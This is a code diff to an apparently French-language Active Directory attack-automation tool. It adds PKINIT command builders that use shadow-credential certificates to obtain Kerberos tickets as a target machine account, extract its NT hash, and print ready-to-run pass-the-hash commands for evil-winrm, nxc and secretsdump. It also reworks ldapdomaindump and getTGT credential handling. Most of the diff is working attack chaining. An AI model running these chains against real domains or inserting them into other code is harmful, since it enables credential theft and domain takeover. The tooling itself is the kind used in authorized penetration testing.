@@ -354,6 +354,8 @@ TOOL_TIMEOUT_BUDGETS: dict[str, int] = {
     "owneredit_read": 180,
     "addcomputer": 180,
     "shadowcred_pkinit_chain": 600,
+    "pkinit_gettgt": 180,
+    "pkinit_getnthash": 120,
     "bloodyad_shadow_add": 180,
     "coercer_run": 180,
     # Web / SQL
@@ -4452,9 +4454,19 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
 
         "ldapdomaindump": ["bash","-c",
             f"mkdir -p {qout}/ldapdomaindump; "
-            f"ldapdomaindump -u {shell_quote(f'{d}\\\\{u}')} -p {qp} "
-            f"-o {qout}/ldapdomaindump -n {qt} {shell_quote(f'ldap://{t}')} 2>&1"
-        ] if t and u and not nt and not cc else None,
+            # Essai 1 : SIMPLE auth avec UPN (user@domain) — compatible LDAP standard AD
+            f"echo '=== Tentative 1 : SIMPLE auth (user@domain) ==='; "
+            f"ldapdomaindump -at SIMPLE -u {shell_quote(f'{u}@{d}')} -p {qp} "
+            f"-o {qout}/ldapdomaindump -n {qt} {shell_quote(f'ldap://{t}')} 2>&1 | tee {qout}/ldapdomaindump/_attempt_simple.log; "
+            f"if ls {qout}/ldapdomaindump/domain_users.json >/dev/null 2>&1; then "
+            f"  echo '[+] SIMPLE auth réussie'; exit 0; "
+            f"fi; "
+            # Essai 2 : NTLM avec nom NetBIOS (partie avant le premier .)
+            f"NETBIOS=$(echo {qd} | cut -d. -f1 | tr '[:lower:]' '[:upper:]'); "
+            f"echo ''; echo \"=== Tentative 2 : NTLM auth ($NETBIOS\\\\{u}) ===\"; "
+            f"ldapdomaindump -at NTLM -u \"$NETBIOS\\\\{u}\" -p {qp} "
+            f"-o {qout}/ldapdomaindump -n {qt} {shell_quote(f'ldap://{t}')} 2>&1 | tee {qout}/ldapdomaindump/_attempt_ntlm.log"
+        ] if t and u and p and not nt and not cc else None,
 
         "ldaps_probe": ["bash","-c",
             f"ldapsearch -x -H {shell_quote(f'ldaps://{t}:636')} -s base namingcontexts 2>&1; "
@@ -4509,15 +4521,10 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"TIMEOUT_BIN=$(command -v timeout || true); "
             f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 120s }}; "
             f"echo '=== getTGT ({d.upper()}/{u}) ==='; "
-            + (f"echo '[*] timedatectl set-ntp false'; "
-               f"printf '%s\\n' {shell_quote(sp)} | sudo -S -p '' timedatectl set-ntp false 2>/dev/null || true; "
-               if sp else
-               "echo '[*] timedatectl set-ntp false'; sudo -n timedatectl set-ntp false 2>/dev/null || true; ")
-            + f"echo '[*] Si Kerberos échoue encore, lance d abord krb5_setup pour forcer la sync NTP sur le DC.'; "
-            + (f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}')} -hashes {shell_quote(':' + nt)} -dc-ip {qt} 2>&1"
+            + "echo '[*] Si Kerberos échoue, lance d abord krb5_setup pour forcer la sync NTP sur le DC.'; "
+            + (f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}')} -hashes {shell_quote(':' + nt)} -dc-ip {qt} </dev/null 2>&1"
                if nt else
-               f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}:{p}')} -dc-ip {qt} 2>&1"
-               if u else "echo '[!] Credentials requis (user+pass ou user+NT)'; exit 1")
+               f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}:{p}')} -dc-ip {qt} </dev/null 2>&1")
             + f"; CC_SRC=$(ls -t {shell_quote(f'{u}.ccache')} 2>/dev/null | head -1); "
             f"if [ -n \"$CC_SRC\" ] && [ -f \"$CC_SRC\" ]; then "
             f"  mv \"$CC_SRC\" \"$CC_DEST\" 2>/dev/null || cp \"$CC_SRC\" \"$CC_DEST\"; "
@@ -4528,7 +4535,7 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"  echo \"export KRB5CCNAME=$CC_DEST\"; "
             f"  echo 'Puis colle ce chemin dans le champ ccache de l UI pour que tous les outils l utilisent (-k).'; "
             f"else echo ''; echo '[!] Aucun .ccache généré — vérifie le mot de passe / NT-hash / temps DC (ntpdate).'; fi"
-        ] if t and d and u else None,
+        ] if t and d and u and (p or nt) else None,
 
         "klist_show": ["bash","-c",
             f"mkdir -p {qout}/kerberos; "
@@ -4670,6 +4677,90 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"  echo '[~] Aucun hash NTLM trouvé dans la sortie — vérifie l auth Kerberos (klist) et les droits GenericWrite sur la cible.'; "
             f"fi"
         ] if t and d and u else None,
+
+        "pkinit_gettgt": ["bash","-c",
+            f"set -o pipefail; "
+            f"PKDIR={qpkdir}; "
+            f"GETTGT_PKI=\"$PKDIR/gettgtpkinit.py\"; "
+            f"mkdir -p {qout}/attack_checks; "
+            f"OUT={qout}/attack_checks/gettgtpkinit.txt; "
+            # Installer PKINITtools si absent
+            f"if [ ! -f \"$GETTGT_PKI\" ]; then "
+            f"  echo '[*] PKINITtools absent — installation auto…'; "
+            f"  command -v git >/dev/null && git clone https://github.com/dirkjanm/PKINITtools \"$PKDIR\" 2>&1 | tail -3 || {{ echo '[!] git requis'; exit 1; }}; "
+            f"  [ -f \"$PKDIR/requirements.txt\" ] && python3 -m pip install -q -r \"$PKDIR/requirements.txt\" 2>&1 | tail -3 || true; "
+            f"fi; "
+            + (f"TARGET_ACCOUNT={qta}; " if ta else "TARGET_ACCOUNT='MSA_HEALTH$'; echo '[!] Aucun target_account — utilise MSA_HEALTH$ par défaut.'; ")
+            # Auto-détection du dernier pair cert/key PEM (dans $OUTDIR, $PWD puis $OUTDIR/bloodyad)
+            + f"CERT_FILE=$(ls -t {qout}/bloodyad/*_cert.pem {qout}/attack_checks/*_cert.pem $PWD/*_cert.pem 2>/dev/null | head -1); "
+            f"KEY_FILE=$(ls -t {qout}/bloodyad/*_priv.pem {qout}/attack_checks/*_priv.pem $PWD/*_priv.pem 2>/dev/null | head -1); "
+            f"if [ -z \"$CERT_FILE\" ] || [ -z \"$KEY_FILE\" ]; then "
+            f"  echo '[!] Pair cert/priv PEM introuvable — lance bloodyad_shadow_add ou shadowcred_pkinit_chain d abord.'; "
+            f"  echo '[*] Chemins cherchés : loot/bloodyad/, attack_checks/, $PWD (*.pem)'; "
+            f"  exit 1; "
+            f"fi; "
+            f"BASE=$(basename \"$CERT_FILE\" _cert.pem); "
+            f"CCACHE_OUT={qout}/attack_checks/${{BASE}}.ccache; "
+            f"echo \"=== PKINIT gettgtpkinit ===\" | tee \"$OUT\"; "
+            f"echo \"cert : $CERT_FILE\" | tee -a \"$OUT\"; "
+            f"echo \"key  : $KEY_FILE\" | tee -a \"$OUT\"; "
+            f"echo \"dest : $CCACHE_OUT\" | tee -a \"$OUT\"; "
+            f"echo ''; "
+            f"python3 \"$GETTGT_PKI\" -cert-pem \"$CERT_FILE\" -key-pem \"$KEY_FILE\" "
+            f"  -dc-ip {qt} {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" \"$CCACHE_OUT\" 2>&1 | tee -a \"$OUT\"; "
+            f"if [ -f \"$CCACHE_OUT\" ]; then "
+            f"  echo ''; echo '=== ccache généré ==='; echo \"$CCACHE_OUT\"; "
+            f"  echo ''; echo '=== klist ==='; KRB5CCNAME=\"$CCACHE_OUT\" klist 2>&1 | tee -a \"$OUT\"; "
+            f"  ASREP_KEY=$(grep -i 'AS-REP encryption key' \"$OUT\" | tail -1 | sed 's/.*: *//'); "
+            f"  echo ''; echo '=== Clé AS-REP (à passer à pkinit_getnthash) ==='; echo \"$ASREP_KEY\"; "
+            f"  echo \"$ASREP_KEY\" > {qout}/attack_checks/${{BASE}}.asrepkey; "
+            f"  echo ''; echo '=== Prochaine étape ==='; "
+            f"  echo '  1. Lance pkinit_getnthash pour extraire le NT hash du compte cible'; "
+            f"  echo \"  2. Ou manuel : KRB5CCNAME=$CCACHE_OUT python3 $PKDIR/getnthash.py -key '$ASREP_KEY' '{d}/$TARGET_ACCOUNT'\"; "
+            f"else "
+            f"  echo '[!] Aucun ccache PKINIT généré — vérifie clock skew / validité du cert.' | tee -a \"$OUT\"; "
+            f"fi"
+        ] if t and d else None,
+
+        "pkinit_getnthash": ["bash","-c",
+            f"set -o pipefail; "
+            f"PKDIR={qpkdir}; "
+            f"GETNTHASH_PKI=\"$PKDIR/getnthash.py\"; "
+            f"mkdir -p {qout}/attack_checks; "
+            f"OUT={qout}/attack_checks/getnthash_pkinit.txt; "
+            f"if [ ! -f \"$GETNTHASH_PKI\" ]; then "
+            f"  echo '[!] PKINITtools absent — lance pkinit_gettgt d abord (il installe auto).'; exit 1; "
+            f"fi; "
+            + (f"TARGET_ACCOUNT={qta}; " if ta else "TARGET_ACCOUNT='MSA_HEALTH$'; echo '[!] Aucun target_account — utilise MSA_HEALTH$ par défaut.'; ")
+            # Auto-détecte le dernier .ccache + .asrepkey généré par pkinit_gettgt
+            + f"CCACHE_FILE=$(ls -t {qout}/attack_checks/*.ccache 2>/dev/null | grep -v {shell_quote(u)}'\\.ccache$' | head -1); "
+            f"[ -z \"$CCACHE_FILE\" ] && CCACHE_FILE=$(ls -t {qout}/attack_checks/*.ccache 2>/dev/null | head -1); "
+            f"ASREP_KEY_FILE=$(ls -t {qout}/attack_checks/*.asrepkey 2>/dev/null | head -1); "
+            f"ASREP_KEY=''; [ -n \"$ASREP_KEY_FILE\" ] && ASREP_KEY=$(cat \"$ASREP_KEY_FILE\"); "
+            f"if [ -z \"$CCACHE_FILE\" ] || [ -z \"$ASREP_KEY\" ]; then "
+            f"  echo '[!] ccache ou clé AS-REP introuvable — lance pkinit_gettgt d abord.'; "
+            f"  echo '    Cherche : attack_checks/*.ccache et attack_checks/*.asrepkey'; "
+            f"  exit 1; "
+            f"fi; "
+            f"echo \"=== PKINIT getnthash ===\" | tee \"$OUT\"; "
+            f"echo \"ccache    : $CCACHE_FILE\" | tee -a \"$OUT\"; "
+            f"echo \"AS-REP key: $ASREP_KEY\" | tee -a \"$OUT\"; "
+            f"echo ''; "
+            f"KRB5CCNAME=\"$CCACHE_FILE\" python3 \"$GETNTHASH_PKI\" -key \"$ASREP_KEY\" "
+            f"  {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUT\"; "
+            f"NTHASH=$(grep -oE '[A-Fa-f0-9]{{32}}' \"$OUT\" | tail -1); "
+            f"if [ -n \"$NTHASH\" ]; then "
+            f"  TA_HOST=$(printf '%s' \"$TARGET_ACCOUNT\" | tr '[:upper:]' '[:lower:]' | sed 's/\\$$//'); "
+            f"  echo ''; echo '=== NT Hash extrait ==='; echo \"$NTHASH\"; "
+            f"  echo ''; echo '=== Commandes prêtes à copier ==='; "
+            f"  echo \"evil-winrm -i {dc if dc else t} -u '${{TA_HOST}}\\$' -H '$NTHASH'\"; "
+            f"  echo \"evil-winrm -i {t} -u '${{TA_HOST}}\\$' -H '$NTHASH'\"; "
+            f"  echo \"{get_nxc()} winrm {t} -u '${{TA_HOST}}\\$' -H '$NTHASH' -d {d}\"; "
+            f"  echo \"impacket-secretsdump -hashes :$NTHASH '{d}/${{TA_HOST}}\\$@{t}'\"; "
+            f"else "
+            f"  echo '[!] Aucun NT hash extrait — vérifie la clé AS-REP ou le ccache.' | tee -a \"$OUT\"; "
+            f"fi"
+        ] if t and d else None,
 
         "shadowcred_pkinit_chain": ["bash","-c",
             f"set -o pipefail; "
